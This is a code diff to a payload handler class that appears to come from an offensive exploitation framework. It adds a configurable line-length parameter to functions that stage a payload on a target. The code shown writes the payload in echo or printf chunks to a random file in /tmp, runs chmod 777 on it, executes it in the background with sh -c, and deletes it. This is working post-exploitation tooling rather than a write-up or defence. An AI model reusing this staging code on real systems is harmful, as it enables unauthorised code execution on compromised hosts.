@@ -137,13 +137,13 @@ class Handler(Server):
         requests.delete(wget_container)
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, delim=';',
-                   location='/tmp'):
+                   location='/tmp', linemax=100):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
 
         echo_stream = "echo -en '{}' >> {}"
-        echo_max_length = 5
+        echo_max_length = linemax
 
         size = len(payload)
         num_parts = int(size / echo_max_length) + 1
@@ -163,13 +163,13 @@ class Handler(Server):
         sender(*args, f"chmod 777 {path} {delim} sh -c \"{path} {payload_args} && rm {path} 2>/dev/null &\"")
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, delim=';',
-                     location='/tmp'):
+                     location='/tmp', linemax=100):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
         path = location + '/' + filename
 
         printf_stream = "printf '{}' >> {}"
-        printf_max_length = 100
+        printf_max_length = linemax
 
         size = len(payload)
         num_parts = int(size / printf_max_length) + 1
@@ -213,7 +213,8 @@ class Handler(Server):
             )
 
     def handle_session(self, host, port, payload, sender=None, args=[],
-                       delim=';', remote_host=None, location='/tmp', timeout=None, method=None, post="printf"):
+                       delim=';', remote_host=None, location='/tmp', timeout=None,
+                       method=None, post="printf", linemax=100):
         if payload['Payload'] is None:
             self.badges.output_error("Payload stage is not found!")
             return False
@@ -232,7 +233,8 @@ class Handler(Server):
                             args,
                             payload['Args'],
                             delim,
-                            location
+                            location,
+                            linemax
                         ]
                     )
                 elif post.lower() == 'echo':
@@ -246,7 +248,8 @@ class Handler(Server):
                             args,
                             payload['Args'],
                             delim,
-                            location
+                            location,
+                            linemax
                         ]
                     )
                 elif post.lower() == 'wget':
@@ -275,7 +278,8 @@ class Handler(Server):
                             args,
                             payload['Args'],
                             delim,
-                            location
+                            location,
+                            linemax
                         ]
                     )
             elif payload['Category'].lower() == 'single':
@@ -314,7 +318,8 @@ class Handler(Server):
                                 args,
                                 payload['Args'],
                                 delim,
-                                location
+                                location,
+                                linemax
                             ]
                         )
                     elif post.lower() == 'echo':
@@ -328,7 +333,8 @@ class Handler(Server):
                                 args,
                                 payload['Args'],
                                 delim,
-                                location
+                                location,
+                                linemax
                             ]
                         )
                     elif post.lower() == 'wget':
@@ -357,7 +363,8 @@ class Handler(Server):
                                 args,
                                 payload['Args'],
                                 delim,
-                                location
+                                location,
+                                linemax
                             ]
                         )
                 elif payload['Category'].lower() == 'single':
